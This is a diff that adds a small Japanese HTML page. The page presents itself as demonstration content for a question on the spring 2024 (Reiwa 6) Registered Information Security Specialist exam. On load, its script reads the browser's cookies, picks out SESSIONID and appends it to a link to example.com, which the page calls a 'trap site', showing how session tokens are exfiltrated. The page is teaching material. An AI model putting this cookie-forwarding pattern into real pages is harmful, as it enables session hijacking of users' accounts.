@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>クッキー情報を他サイトへ転送</title>
+    <script>
+        window.onload = function() {
+            // すべてのクッキーを取得
+            let cookies = document.cookie.split(";");
+
+            // `SESSIONID`クッキーを検索してリンクを表示
+            cookies.forEach(cookie => {
+                let [name, value] = cookie.trim().split("=");
+                if (name === "SESSIONID") {
+                     let link = document.createElement("a");
+                     link.href = `https://example.com?SESSIONID=${value}`;
+                     link.innerText = "クリックしてSESSIONIDを含むURLへ移動";
+                     document.getElementById("cookieValue").appendChild(link);
+                }
+            });
+        };
+    </script>
+</head>
+<body>
+    <h1>情報処理安全確保支援士　令和6年度春期試験午後問3設問1（2）の実証コンテンツ</h1>
+    <p>SESSIONIDのcookieを受信したら，罠サイトへのリンクにSESSIONIDを埋め込みます。</p>
+    <p id="cookieValue">罠サイトへのリンクはこちら<br></p>
+</body>
+</html>
